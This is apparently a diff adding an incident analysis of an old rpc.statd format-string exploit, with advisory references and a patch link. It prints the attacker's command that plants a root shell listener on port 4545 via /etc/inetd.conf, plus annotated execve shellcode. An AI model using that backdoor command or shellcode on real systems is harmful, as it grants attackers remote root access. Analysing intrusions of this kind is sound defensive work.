@@ -1,0 +1,69 @@
+[=-=-=-=-=-=-=-]          Vulnerability analysis          [=-=-=-=-=-=-=-]
+
+The attacker (ab)used a security bug in rpc.statd program, which
+is vulnerable to format-string vulnerability.  More information about
+the actual vulnerability can be found in
+
+CA-2000-17
+     * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2000-0666
+BugtraqID 1480
+     * http://www.securityfocus.com/bid/1480
+
+The used exploit (rpc-statd.c) is also available at the former site.
+
+RedHat has released an advisory concerning this vulnerability, which
+is available as  RHSA-2000:043-0[23].
+
+For i386, the update is available at:
+ftp://updates.redhat.com/6.2/i386/nfs-utils-0.1.9.1-1.i386.rpm
+
+
+----------------------------------------------------------------------------
+The exploit was written by Doing in August 2000 and the attacker launched
+it with following parameter:
+
+echo 4545 stream tcp nowait root /bin/sh -i >> /etc/inetd.conf;killall -HUP inetd
+
+
+// Find $eip
+ 8049350:	eb 4b                	jmp    804939d <_fini+0x18d>
+ 8049352:	5e                   	pop    %esi
+
+// Create the necessary addresses
+ 8049353:	89 76 ac             	mov    %esi,0xffffffac(%esi)
+ 8049356:	83 ee 20             	sub    $0x20,%esi
+ 8049359:	8d 5e 28             	lea    0x28(%esi),%ebx
+ 804935c:	83 c6 20             	add    $0x20,%esi
+ 804935f:	89 5e b0             	mov    %ebx,0xffffffb0(%esi)
+ 8049362:	83 ee 20             	sub    $0x20,%esi
+ 8049365:	8d 5e 2e             	lea    0x2e(%esi),%ebx
+ 8049368:	83 c6 20             	add    $0x20,%esi
+ 804936b:	83 c3 20             	add    $0x20,%ebx
+ 804936e:	83 eb 23             	sub    $0x23,%ebx
+ 8049371:	89 5e b4             	mov    %ebx,0xffffffb4(%esi)
+
+// Split the command line into arguments
+ 8049374:	31 c0                	xor    %eax,%eax
+ 8049376:	83 ee 20             	sub    $0x20,%esi
+ 8049379:	88 46 27             	mov    %al,0x27(%esi)
+ 804937c:	88 46 2a             	mov    %al,0x2a(%esi)
+ 804937f:	83 c6 20             	add    $0x20,%esi
+ 8049382:	88 46 ab             	mov    %al,0xffffffab(%esi)
+ 8049385:	89 46 b8             	mov    %eax,0xffffffb8(%esi)
+
+// execve(...)
+ 8049388:	b0 2b                	mov    $0x2b,%al
+ 804938a:	2c 20                	sub    $0x20,%al
+ 804938c:	89 f3                	mov    %esi,%ebx
+ 804938e:	8d 4e ac             	lea    0xffffffac(%esi),%ecx
+ 8049391:	8d 56 b8             	lea    0xffffffb8(%esi),%edx
+ 8049394:	cd 80                	int    $0x80
+
+// exit(0)
+ 8049396:	31 db                	xor    %ebx,%ebx
+ 8049398:	89 d8                	mov    %ebx,%eax
+ 804939a:	40                   	inc    %eax
+ 804939b:	cd 80                	int    $0x80
+ 804939d:	e8 b0 ff ff ff       	call   8049352 <_fini+0x142>
+/bin/sh -c echo 4545 stream tcp nowait root /bin/sh -i >> /etc/inetd.conf;killall -HUP inetd
+
